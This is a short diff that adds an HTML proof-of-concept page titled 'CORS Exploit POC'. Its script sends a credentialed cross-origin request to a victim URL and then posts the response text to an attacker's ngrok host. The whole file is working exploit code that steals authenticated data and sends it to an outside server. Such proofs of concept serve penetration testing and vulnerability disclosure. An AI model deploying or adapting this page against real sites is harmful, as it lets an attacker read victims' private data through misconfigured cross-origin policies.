@@ -1,0 +1,25 @@
+<html>
+	<head>
+		<title>CORS Exploit POC</title>
+	</head>
+	<body>
+		<h1>CORS Exploit POC</h1>
+		<script>
+			var cors = new XMLHttpRequest();
+			var Victim_url = 'http://ip-api.com/json';
+			cors.open('GET', Victim_url, true);
+			cors.withCredentials = true;
+			cors.onload = reqListener;
+			cors.send();
+			console.log(this.responseText)
+
+			function reqListener() {
+				var data = new XMLHttpRequest();
+				var attacker_url = 'http://a61a00a9.ngrok.io/bin/datafetch.py';
+				data.open('POST', attacker_url);
+				data.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+				data.send('responsehtml=' + encodeURIComponent(String(this.responseText)));
+			};
+		</script>
+	</body>
+</html>
